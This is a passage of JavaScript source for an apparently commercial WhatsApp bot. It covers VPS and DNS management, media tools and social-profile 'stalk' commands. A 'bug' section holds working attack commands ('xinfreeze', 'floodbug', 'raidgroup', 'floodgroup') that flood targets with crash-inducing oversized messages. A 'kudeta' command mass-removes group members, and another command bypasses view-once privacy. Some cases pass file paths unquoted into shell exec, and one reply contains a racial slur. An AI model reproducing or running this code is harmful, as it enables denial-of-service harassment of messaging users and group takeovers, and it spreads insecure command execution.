if (!args[0]) return m.reply("Domain tidak ditemukan!\nContoh Penggunaan Yang Benar: .domain 3 hostname|ipVps")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!\nContoh Penggunaan Yang Benar: .domain 3 hostname|ipVps")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!\nContoh Penggunaan Yang Benar: .domain 3 hostname|ipVps")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

case 'listdroplet': {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.token_do
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
xin.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break
case 'sendvps': {
if (!isOwner) return m.reply("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx,ip,ram,harga,password`)
ReplyX("*Pesanan Terkirim 📦!") 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
var m4 = mon.split(",")[3]
var m5 = mon.split(",")[4]
let dex1 = m1 + '@s.whatsapp.net'
let rajanye = global.owner + '@s.whatsapp.net'
let gue = m.sender
let ments = [dex1, rajanye, gue]
rafatharcode.sendMessage(mq1, {text: `
*📦 PESANAN MU DATANG 📦*
Harga: ${m4}
Username: Root
Password: ${m5}
Ram: ${m3}

*°•——————  TOS VPS  ——————•°*
- Jangan Dipakai Untuk DDoS 
- Jangan Dipakai Untuk Tunneling
- Batas CPU 120%
Melanggar? garansi hangus & no reff! `}, m) 
}
break
case 'restartvps': {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

case 'rebuild': {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
xin.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case "sisadroplet": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.token_do}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.token_do}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case "deldroplet": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break
case "r1c1": case "r2c1": case "r4c2": case "r8c4": case "r16c4": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!text) return m.reply(`Example : *.${command}* hostname`)
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "syd1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(`Example : *.${command}* hostname`)
    function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

    try {        
        let dropletData = {
            name: hostname,
            region: region,
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        const password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.token_do 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...\nSilahkan Tunggu 2-5 Menit !`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.token_do
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `Sukses Membuat VPS!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await xin.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

            case 'p': {
               ReplyX('Hai Negro\nAda yang bisa saya bantu?')
            }
            break
			
			case "public": {
				if (!isOwner) return
				m.reply("Success Change to *Public* Mode")
				xin.public = true
			}
			break

			case "self": {
				if (!isOwner) return
				m.reply("Success Change to *Self* Mode")
				xin.public = false
			}
			break
    
      // bug & mins case //
case 'xinfreeze': 
     if (!isPrem) return ReplyX(` Khusus Premium Lol `)
   if (!q) return ReplyX(`Syntax Error\nUsage: ${prefix + command} 62x`)
bugtarg = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyX(` Target: ${bugtarg}
Requested Bug: Freeze Bug
 `)
     for (let i = 0; i < 1; i++) {
    await locasifreeze(bugtarg, ptcp = true)
    await nulltag(bugtarg, ptcp = true)
    await nulltag(bugtarg, ptcp = true)
     }
ReplyX(` Successfully Sent Bugs To ${bugtarg}
Bug Type: Request Call Freeze
 `)
 break
case 'floodbug': 
     if (!isPrem) return ReplyX(` Khusus Premium Lol `)
   if (!q) return ReplyX(`Syntax Error\nUsage: ${prefix + command} 62x`)
bugtarg = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ReplyX(` Target: ${bugtarg}
Requested Bug: Mix & Floods
 `)
     for (let i = 0; i < 3; i++) {
    await locasifreeze(bugtarg, ptcp = true)
    await execute(bugtarg, ptcp = true)
    await doxument(bugtarg, ptcp = true)
    await nulltag(bugtarg, ptcp = true)
     }
ReplyX(` Successfully Sent Bugs To ${bugtarg}
Bug Type: Mix & Floods
 `)
 break
 case 'tesbug': 
    if (!isPrem) return ReplyX("Khusus Premium Lol")
    for (let i = 0; i < 3; i++) {
    await groupbug(ptcp = true)
    }
    break;

case 'raidgroup':{
if (!isOwner) return ReplyX("Khusus Owner")
if (!q) return ReplyX(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
ReplyX(`Proses`)
fakelink = global.mentahanv
for (let i = 0; i < amount; i++) {
xin.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: oscrash, address: `1.1.1.1.11`, url: `https://${fakelink}.com`, comment: ` hai 🌷`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `💸 SexMoneyDrugz`.repeat(10000),serverMessageId: 2 }}} }, { quoted: qbugz })
await sleep(1500)
}
ReplyX(`Sukses Raid Group`)
}
break
case 'tesbug': 
    if (!isPrem) return ReplyX("Khusus Premium Lol")
    for (let i = 0; i < 3; i++) {
     await TestingBug
    }
    break
case 'floodgroup': {
	if (!isPrem) return ReplyX(` Khusus Prem `)
	async function xd(bugtarg, chat, participant) {
xin.sendMessage(
chat,
{
document: { url: "./package.json" },
mimetype: `image/null`,
fileName: `𝐆͙̟͙͢𝐫𝐮ܑ͖𝐩 𝐀̽͢𝐦̈́𝐩𝐚̭͝𝐬 𝐊ܑ͢𝐨𝐧͖̽͢𝐭𝐨𝐥 ͝🚮̽̈́͢͜`,
caption: "Awogawogawog",
},
{ quoted: { ...nullgb, key: { ...nullgb.key, participant } } }
);
}
async function fuckthisgroup() {
if (!args[0]) amount = `99`;
for (let i = 1; i < 10; i++) {
xd(pushname, m.chat, m.sender);

}
}
	await fuckthisgroup();
}
              console.log(chalk.green("Group Attack Sent | Raid By Xinn"));
break
case 'clearbugs': {
if (!isPrem) return ReplyX(" Khusus Premium ")
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
xin.sendMessage(BapakLuWkwk, {text: `Bug Cleared \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug 😹")
}
break 

 // end bug case //
 			//━━━━━━━━━━━━━━━[ CASE COMMAND STALKER ]━━━━━━━━━━━━━━━━━//
			case 'ffstalk': {
				
				if (!q) return ReplyX(`*Masukan ID nya!*\n\nContoh:\n${prefix+command} 12345678`)
				if (isNaN(text)) return ReplyX(`ID harus berupa angka!`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let epep = await stalk.ff(text)
					if (epep === null) return m.reply('Username Tidak Ditemukan.')
					m.reply(`Id : ${text}
Nickname : ${epep}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'mlstalk': {
				
				if (!text) return ReplyX(`*Masukan Input Query!*\n\nContoh:\n${prefix+command} idgame idserver`)
				if (!args[0]) return ReplyX(`ID harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
				if (!args[1]) return ReplyX(`ID Zone harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let emel = await stalk.ml(args[0], args[1])
					m.sendForward(`ID : ${args[0]}
ID Zone : ${args[1]}
Nickname : ${emel.userName}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'githubstalk':
			case 'ghstalk': {
				
				if (!q) return ReplyX(`*Masukan nickname nya!*\n\nContoh:\n${prefix+command} xin`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let data = await fetchJson(`https://api.github.com/users/${text}`)
					if (data.login) {
						xin.sendMessage(m.chat, {
							image: {
								url: data.avatar_url
							},
							caption: `*\`乂 GITHUB - STALK\`*\n\n*ID :* ${data.id}\n*Nickname :* ${data.login}\n*Fullname :* ${data.name}\n*Repository :* ${data.public_repos}\n*Followers :* ${data.followers}\n*Following :* ${data.following}\n*Site Admin :* ${data.site_admin ? "Admin" : 'Pengguna'}\n*Company :* ${data.company}\n*Blog Web :* ${data.blog}\n*Create At :* ${data.created_at}\n*Update At :* ${data.updated_at}\n*Location :* ${data.location}\n*Bio :*\n${data.bio}\n`
						}, {
							quoted: m
						})
					} else {
						m.reply("Username tersebut tidak ditemukan")
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'igstalk': {
				
				if (!q) return ReplyX(`*Masukan nickname nya!*\n\nContoh:\n${prefix+command} yahyaalmthr`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anuu = await fetchJson(`https://api.vreden.my.id/api/igstalk?query=${text}`)
					const anu = anuu.result
					const nick = anu.result.user.username
					const nama = anu.result.user.full_name
					const post = await convertAngka(anu.result.user.media_count)
					const foll = await convertAngka(anu.result.user.follower_count)
					const foli = await convertAngka(anu.result.user.following_count)
					const bio = anu.result.user.biography
					const jenis = anu.result.user.is_business
					xin.sendMessage(m.chat, {
						image: {
							url: anu.result.user.hd_profile_pic_url_info.url
						},
						caption: `*\`乂 INSTA - STALK\`*\n\n*Nickname :* ${nick}\n*Fullname :* ${nama}\n*Postingan :* ${post}\n*Followers :* ${foll}\n*Following :* ${foli}\n*Jenis Akun:* ${jenis ? "Bisnis" : 'Pribadi'}\n*Bio :*\n${bio}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ttstalk':
			case 'tiktokstalk': {				
				if (!q) return ReplyX(`*Masukan nickname nya!*\n\nContoh:\n${prefix+command} yahyaalialmthr`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = await fetchJson(`https://api.vreden.my.id/api/tiktokStalk?query=${text}`)
					let post = await convertAngka(result.result.stats.videoCount)
					let follwer = await convertAngka(result.result.stats.followerCount)
					let follwing = await convertAngka(result.result.stats.followingCount)
					let likes = await convertAngka(result.result.stats.heartCount)
					let fien = await convertAngka(result.result.stats.friendCount)
					xin.sendMessage(m.chat, {
						image: {
							url: result.result.user.avatarLarger
						},
						caption: `*\`乂 TIKTOK - STALK\`*\n\n*Nickname :* ${result.result.user.nickname}\n*Username :* ${result.result.user.uniqueId}\n*Postingan :* ${post}\n*Pengikut :* ${follwer}\n*Mengikuti :* ${follwing}\n*Suka :* ${likes}\n*Teman :* ${fien}\n*Bio :* \n${result.result.user.signature}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
 // miscs // 
  //=== Tools Menu ==//
case 'toanime': {
    async function uploadUguu(filePath) {
        return new Promise((resolve, reject) => {
            exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
                if (error) return reject('Gagal mengunggah ke Uguu');
                try {
                    let jsonResponse = JSON.parse(stdout);
                    resolve({ status: 'Done', result: jsonResponse.files[0].url });
                } catch (err) {
                    reject('Gagal mengunggah ke Uguu');
                }
            });
        });
    }
if (!quoted) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
ReplyX("Tunggu Sebentar . . . ")
let media = await xin.downloadAndSaveMediaMessage(quoted);
let uploadResult = await uploadUguu(media);    
if (uploadResult.status !== 'Done') {
return m.reply('Gagal mengunggah gambar.');
}
let cdn = uploadResult.result;
let imge;    
try {
imge = `https://api.zenkey.my.id/api/maker/toanime?apikey=zenkey&url=${cdn}`;
} catch (error) {
console.error('Error fetching from API:', error);
return m.reply('Terjadi kesalahan saat mengambil data dari API.');
}
xin.sendMessage(m.chat, { image: { url: imge }, caption: 'Done' }, { quoted: ctt });
}
break
  case "ig": {
if (!text) return ReplyX("Mana Linknya?")
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xin.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xin.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await xin.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

  case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply("Mana Linknya?")
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xin.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xin.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await xin.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

  case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return ReplyX("Usage:\nid good night")
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return ReplyX("Usage:\nid good night")
if (args.length < 1) return ReplyX("Usage:\nid good night")
if (!m.quoted.text) return ReplyX("Usage:\nid good night")
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return ReplyX("Usage:\nBahasa Yang Mau Kalian Translate + Teks\nContoh: en Selamat Siang")
}}
break
  case "stickerwm": case "wm": {
if (!text) return m.reply("Usage:\nNamamu dengan kirim media")
if (!/image|video/gi.test(mime)) return m.reply("Usage:\nNamamu dengan kirim media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await xin.downloadAndSaveMediaMessage(qmsg)
await xin.sendImageAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break
case "kudeta": {
 if (!isGroup) return ReplyX("Khusus Dalam Grup")
    if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin . . . ")
    let memberFilter = await groupMembers.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    if (memberFilter.length < 1) return m.reply("Group Ini Tidak Ada Member . . .")
    await m.reply("RAIDED BY XINZETT")
    for (let i of memberFilter) {
    await xin.groupParticipantsUpdate(m.chat, [i], 'remove')
    await sleep(1000)
    }
    await m.reply("Raid Succesful")
    }
    break
              case 's': 
            case 'sticker': 
            case 'stiker': {            
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let Encmedia = await xin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return ReplyX(`Reply gambar dengan keterangan/caption ${prefix+command}\nJika media yang ingin dijadikan sticker adalah video, batas maksimal durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await xin.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    ReplyX(`Reply gambar dengan keterangan/caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply("Mana Videonya?")
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await xin.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
xin.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) {
                    return ReplyX(`Reply/Balas stiker dengan teks: *${prefix + command}*`);
                }
                
                let media = await xin.downloadAndSaveMediaMessage(qmsg);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    xin.sendMessage(m.chat, { image: buffer }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            }
            break
  case 'qc': {
    if (!q) return ReplyX('Enter Text');
    const senderpfp = await xin.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": senderpfp
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "AdrianTzy",
        result: buffer
    };

    xin.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break;
  case "ssweb": {
if (!text) return ReplyX("https://example.com")
if (!isUrl(text)) return ReplyX("https://example.com")
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
var data = await screenshotV2(text)
await xin.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
 case "tohd": case "hd": {
if (!/image/.test(mime)) return ReplyX("dengan kirim/reply foto")
let foto = await xin.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await xin.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break
 case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://aemt.uk.to/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

 case "modapk": {
if (!text) return ReplyX("*Syntax Error!*\n Contoh: .modapk CapCut")
await xin.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
xin.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break
  case "rvo": case "r": case "readviewonce": {
if (!m.quoted) return ReplyX("Reply Foto 1 View")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return xin.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return xin.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
